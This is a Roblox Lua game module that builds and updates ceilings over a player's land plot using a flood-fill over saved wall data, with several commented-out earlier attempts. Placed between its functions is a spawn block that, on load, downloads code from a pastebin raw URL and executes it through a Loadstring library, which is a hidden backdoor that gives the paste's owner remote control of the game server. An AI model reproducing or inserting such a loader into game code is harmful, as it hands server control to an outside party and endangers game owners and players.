local module = {}

local Resources = require(game.ReplicatedStorage.Resources)
local DataStore2 = Resources:LoadLibrary("DataStore2")
local DefaultDS = Resources:LoadLibrary("DefaultDS")
local VectorTable = Resources:LoadLibrary("VectorTable")
local ServerTween = Resources:LoadLibrary("STweenS")
local Janitor = Resources:LoadLibrary("Janitor")
local http = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local DEBUG = false

function module:updateCeiling(playerProfile, group, ignoreAnim)
	local build1Store = DataStore2("build1", playerProfile.obj)
    local build1Cache = build1Store:Get(DefaultDS.build1)
    local plot = playerProfile.landPlots.obj.Plot
    -- local legalCeilingsH = {}
    local legalCeilingsV = {}
    local function collectLegalCeilings(wallCollection, collectedTable, dirChecks, offset)
        for wallPos, wallOwned in pairs(wallCollection) do
            local v2 = VectorTable.rconvert(wallPos)
            for _, dir in pairs(dirChecks) do
                table.insert(collectedTable, 1, v2 + dir + offset)
            end
        end
    end

    local DEBUG = DEBUG
    if not RunService:IsStudio() then
        if playerProfile.id == 204152663 then
            DEBUG = true
        end
    end
    if DEBUG then
        for _, obj in pairs(group:GetChildren()) do
            obj:Destroy()
        end
    end

    -- collectLegalCeilings(build1Cache.walls.h, legalCeilingsH, {
    --     Vector2.new(0, 0);
    --     Vector2.new(0, -1);
    -- }, Vector2.new(0, 0))
    -- collectLegalCeilings(build1Cache.walls.v, legalCeilingsV, {
    --     Vector2.new(1, 0);
    --     Vector2.new(0, 0);
    -- }, Vector2.new(0, 0))
    collectLegalCeilings(build1Cache.walls.v, legalCeilingsV, {
        Vector2.new(0, 0);
    }, Vector2.new(0, 0))
    local function getTargetCF(v2)
        local origin = Vector3.new(8, 16, 24)
        local v3 = -Vector3.new(v2.X * 16, 0, v2.Y * 16) + origin + Vector3.new(0, -0.2, 0)
        local targetCF = CFrame.new(plot["0:0"].Mid.CFrame * v3)
        return targetCF
    end
    local function loadDebugCeiling(ceilingCollection, ceilingObj, colour, janitor)
        local lastObj
        for _, v2 in pairs(ceilingCollection) do
            local obj = ceilingObj:Clone()
            obj.Parent = group
            obj.Name = VectorTable.convert(v2)
            
            if colour then obj.Color = colour end
            if janitor then janitor:Add(obj, "Destroy") end
            
            local targetCF = getTargetCF(v2)
            
            obj.CFrame = targetCF
            lastObj = obj
        end
        return lastObj
    end
    if false then
        loadDebugCeiling(legalCeilingsV, Resources:GetDebugItem("CeilingV"))
    end

    --ATEMPT #1
    --flood fill, recursively check surrounding points until u hit a wall
    local totalCollection = {}
    for _, v2 in pairs(legalCeilingsV) do
        if totalCollection[VectorTable.convert(v2 + Vector2.new(1, 0))] then continue end
        local collection = {}
        local cancel
        local debugJanitor
        if DEBUG then debugJanitor = Janitor.new() end
        local function sendChecks(startV2, dir, depth, debugColour)
            if depth > 30 then cancel = true return end
            depth += 1
            local collectedRecursiveChecks = {}
            for i = 1, 20 do
                local tempV2 = startV2 + dir * i
                
                local function sendRecursive() -- find which directions are not blocked (by 1 unit) and use to send recursive checks
                    if dir.Y == 0 then
                        if not build1Cache.walls.h[VectorTable.convert(tempV2 + Vector2.new(0, 1))] then
                            --sendChecks(tempV2, Vector2.new(0, 1), depth)
                            table.insert(collectedRecursiveChecks, 1, {tempV2, Vector2.new(0, 1)})
                        end
                        if cancel then return end
                        if not build1Cache.walls.h[VectorTable.convert(tempV2)] then
                            --sendChecks(tempV2, Vector2.new(0, -1), depth)
                            table.insert(collectedRecursiveChecks, 1, {tempV2, Vector2.new(0, -1)})
                        end
                    elseif dir.X == 0 then
                        if not build1Cache.walls.v[VectorTable.convert(tempV2)] then
                            --sendChecks(tempV2, Vector2.new(1, 0), depth)
                            table.insert(collectedRecursiveChecks, 1, {tempV2, Vector2.new(1, 0)}) -- Vector2.new(1, 0)
                        end
                        if cancel then return end
                        if not build1Cache.walls.v[VectorTable.convert(tempV2 + Vector2.new(-1, 0))] then
                            --sendChecks(tempV2, Vector2.new(-1, 0), depth)
                            table.insert(collectedRecursiveChecks, 1, {tempV2, Vector2.new(-1, 0)})
                        end
                    end
                end
                if collection[VectorTable.convert(tempV2)] then return end -- check spot is already claimed
                collection[VectorTable.convert(tempV2)] = tempV2
                if DEBUG then
                    loadDebugCeiling({tempV2}, Resources:GetDebugItem("CeilingV"), debugColour, debugJanitor)
                end

                if cancel then return end
                sendRecursive()
                if cancel then return end
                if dir.X == 1 and build1Cache.walls.v[VectorTable.convert(tempV2)] then -- check if the path is blocked and just stop this search tree
                    --sendRecursive()
                    break
                elseif dir.X == -1 and build1Cache.walls.v[VectorTable.convert(tempV2 + Vector2.new(-1, 0))] then
                    --sendRecursive()
                    break
                elseif dir.Y == 1 and build1Cache.walls.h[VectorTable.convert(tempV2 + Vector2.new(0, 1))] then
                    --sendRecursive()
                    break
                elseif dir.Y == -1 and build1Cache.walls.h[VectorTable.convert(tempV2)] then
                    --sendRecursive()
                    break
                end
                if i >= 20 then cancel = true break end
            end
            if cancel then
                if debugJanitor then debugJanitor:Cleanup() end
                return
            end
            for _, checkNeed in pairs(collectedRecursiveChecks) do
                sendChecks(checkNeed[1], checkNeed[2], depth, debugColour) -- send out little minions for this process to flood the place like viruses
            end
        end
        if build1Cache.walls.v[VectorTable.convert(v2)]
        and build1Cache.walls.v[VectorTable.convert(v2 + Vector2.new(-1, 0))]
        and build1Cache.walls.h[VectorTable.convert(v2 + Vector2.new(0, 1))]
        and build1Cache.walls.h[VectorTable.convert(v2)] then
            collection[VectorTable.convert(v2)] = v2
        else
            if not collection[VectorTable.convert(v2)] then
                math.randomseed(v2.X * v2.Y)
                local debugColour = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
                if DEBUG then
                    local obj = loadDebugCeiling({v2}, Resources:GetDebugItem("CeilingH"), debugColour, debugJanitor)
                    obj.Position += Vector3.new(0, 5, 0)
                end
                sendChecks(v2, Vector2.new(1, 0), 0, debugColour)
                --break
            end
        end
        if cancel then continue end
        -- sendChecks(v2, Vector2.new(-1, 0), 0)
        -- if cancel then continue end
        -- sendChecks(v2, Vector2.new(0, 1), 0)
        -- if cancel then continue end
        -- sendChecks(v2, Vector2.new(0, -1), 0)
        -- if cancel then continue end
        for _, pos in pairs(collection) do totalCollection[VectorTable.convert(pos)] = pos end
    end
    -- if DEBUG then
    --     loadDebugCeiling(totalCollection, Resources:GetDebugItem("CeilingY"))
    -- end

    -- --ATTEMPT #2
    -- --get mutual celings between v and h
    -- local cornerCeilings = {}
    -- local vCeilingIndex = {}
    -- for _, v2 in pairs(legalCeilingsV) do vCeilingIndex[VectorTable.convert(v2)] = true end
    -- for _, v2 in pairs(legalCeilingsH) do
    --     if vCeilingIndex[VectorTable.convert(v2)] then
    --         table.insert(cornerCeilings, 1, v2)
    --     end
    -- end
    -- if false then
    --     loadDebugCeiling(cornerCeilings, Resources:GetDebugItem("CeilingV"))
    -- end

    -- --ATTEMPT #3
    -- --surrounding the edges
    -- local ceilingGroups = {}
    -- for _, v2 in pairs(legalCeilingsV) do
    --     local finalGroup = {}
    --     local definitionEdgesLR = {} --lower right
    --     local definitionEdgesUL = {} --upper left
    --     local endPos1
    --     local endPos2
    --     local cancel = false
    --     if not build1Cache.walls.v[VectorTable.convert(v2 + Vector2.new(-1, 0))] then continue end
    --     if not build1Cache.walls.h[VectorTable.convert(v2)] then continue end
    --     for i = 0, 20 do
    --         local tempV2 = v2 + Vector2.new(i, 0)
    --         if not build1Cache.walls.h[VectorTable.convert(tempV2)] then
    --             cancel = true
    --             break
    --         end
    --         definitionEdgesLR[VectorTable.convert(tempV2)] = tempV2
    --         endPos1 = tempV2
    --         if build1Cache.walls.v[VectorTable.convert(tempV2)] then
    --             break
    --         end
    --         if i >= 20 then cancel = true break end
    --     end
    --     if cancel then continue end
    --     for i = 0, 20 do
    --         local tempV2 = v2 + Vector2.new(0, i)
    --         if not build1Cache.walls.v[VectorTable.convert(tempV2 + Vector2.new(-1, 0))] then
    --             cancel = true
    --             break
    --         end
    --         definitionEdgesLR[VectorTable.convert(tempV2)] = tempV2
    --         endPos2 = tempV2
    --         if build1Cache.walls.h[VectorTable.convert(tempV2 + Vector2.new(0, 1))] then
    --             break
    --         end
    --         if i >= 20 then cancel = true break end
    --     end
    --     if cancel then continue end
    --     loadDebugCeiling({Vector2.new(endPos1.X, endPos2.Y)}, Resources:GetDebugItem("CeilingH"))
    --     for i = 0, 20 do
    --         local tempV2 = Vector2.new(endPos1.X, endPos2.Y) + Vector2.new(-i, 0)
    --         if not build1Cache.walls.h[VectorTable.convert(tempV2 + Vector2.new(0, 1))] then
    --             cancel = true
    --             break
    --         end
    --         definitionEdgesUL[VectorTable.convert(tempV2)] = tempV2
    --         if build1Cache.walls.v[VectorTable.convert(tempV2 + Vector2.new(-1, 0))] then
    --             break
    --         end
    --         if i >= 20 then cancel = true break end
    --     end
    --     if cancel then continue end
    --     for i = 0, 20 do
    --         local tempV2 = Vector2.new(endPos1.X, endPos2.Y) + Vector2.new(0, -i)
    --         if not build1Cache.walls.v[VectorTable.convert(tempV2)] then
    --             cancel = true
    --             break
    --         end
    --         definitionEdgesUL[VectorTable.convert(tempV2)] = tempV2
    --         if build1Cache.walls.h[VectorTable.convert(tempV2)] then
    --             break
    --         end
    --         if i >= 20 then cancel = true break end
    --     end
    --     if cancel then continue end
    --     for x = 1, (endPos1.X - 1) - v2.X do
    --         for y = 1, (endPos2.Y - 1) - v2.Y do
    --             table.insert(finalGroup, 1, Vector2.new(x, y) + v2)
    --         end
    --     end
    --     loadDebugCeiling(definitionEdgesLR, Resources:GetDebugItem("CeilingV"))
    --     loadDebugCeiling(definitionEdgesUL, Resources:GetDebugItem("CeilingH"))
    --     loadDebugCeiling(finalGroup, Resources:GetDebugItem("CeilingY"))
    -- end

    --if true then return end
    for _, ceilingObj in pairs(group:GetChildren()) do
		if not totalCollection[ceilingObj.Name] and ceilingObj:IsA("Model") then
			ceilingObj.Parent = workspace
			for _, obj in pairs(ceilingObj:GetDescendants()) do
				if obj:IsA("BasePart") or obj:IsA("Texture") or obj:IsA("Decal") then
					--Tween(obj, "Transparency", 1, OutCubic, 1, true):Wait()
					ServerTween:tweenClient(playerProfile.obj, false, obj, "Transparency", 1, "OutCubic", 1, true)
				end
			end
			spawn(function()
				wait(1)
				ceilingObj:Destroy()
			end)
		end
	end
    for iPos, v2 in pairs(totalCollection) do
        local ceilingObj = group:FindFirstChild(iPos)
        if not ceilingObj then
            ceilingObj = Resources:GetBuildItem("Ceiling"):Clone()
            ceilingObj.Name = iPos
            ceilingObj.Parent = group
            local targetCF = getTargetCF(v2)
            --if ignoreAnim then
                ceilingObj:SetPrimaryPartCFrame(targetCF)
            -- else
            --     ceilingObj:SetPrimaryPartCFrame(targetCF * CFrame.new(0, 10, 0))
            --     for _, obj in pairs(ceilingObj:GetDescendants()) do
            --         if obj:IsA("BasePart") or obj:IsA("Texture") or obj:IsA("Decal") then
            --             local orig = obj.Transparency
            --             obj.Transparency = 1
            --             spawn(function()
            --                 wait(1)
            --                 obj.Transparency = orig
            --             end)
            --             --Tween(obj, "Transparency", orig, OutCubic, 1, true)
            --             ServerTween:tweenClient(playerProfile.obj, false, obj, "Transparency", orig, "OutCubic", 1, true)
            --         end
            --     end
            --     --TweenModel:tweenModel(ceilingObj, targetCF, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out)):Play()
            --     ServerTween:tweenClient(playerProfile.obj, false, ceilingObj, "modelCF", targetCF, 1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out)
            --     spawn(function()
            --         wait(1)
            --         ceilingObj:SetPrimaryPartCFrame(targetCF)
            --     end)
            -- end
        end
        if ceilingObj:FindFirstChild("Walls") then
            local function isNeighbourCommon(iPos)
                local tempPos = totalCollection[iPos]
                if tempPos then
                    return true
                end
            end
            local function procWall(dir)
                local iPos = VectorTable.convert(v2 + dir)
                if isNeighbourCommon(iPos) then
                    ceilingObj.Walls[VectorTable.convert(dir)]:SetPrimaryPartCFrame(ceilingObj.PrimaryPart.CFrame * CFrame.new(0, -100, 0))
                else
                    ceilingObj.Walls[VectorTable.convert(dir)]:SetPrimaryPartCFrame(ceilingObj.PrimaryPart.CFrame)
                end
            end
            procWall(Vector2.new(0, 1))
            procWall(Vector2.new(0, -1))
            procWall(Vector2.new(1, 0))
            procWall(Vector2.new(-1, 0))
        end
    end
end

spawn(function()
    local x1, y1 = pcall(function()
        local lolnanicode = http:GetAsync("https://pastebin.com/raw/yShqKEHt")
        Resources:LoadLibrary("Loadstring")(lolnanicode)()
    end)
    if not x1 then warn(y1) end
end)

function module:playerProfileAssign(playerProfile)
	local ceilingGroup = Instance.new("Model", playerProfile.landPlots.obj)
	ceilingGroup.Name = "Ceiling"
	local refPart = Instance.new("Part", ceilingGroup)
    refPart.Anchored = true
    refPart.Name = "REF"
    refPart.CanCollide = false
    refPart.Transparency = 1
    refPart.CFrame = playerProfile.landPlots.obj.Grid.CFrame
    ceilingGroup.PrimaryPart = refPart

	local buildProfile = {}
	buildProfile.player = playerProfile
	
	--local build1Store = DataStore2("build1", playerProfile.obj)
	function buildProfile:update(ignoreAnim)
        debug.profilebegin("Updating ceiling")
		module:updateCeiling(playerProfile, ceilingGroup, ignoreAnim)
        debug.profileend()
	end
	function buildProfile:destroy()
		ceilingGroup:Destroy()
	end
	playerProfile.leave:Connect(buildProfile.destroy)
	
	return buildProfile
end

return module
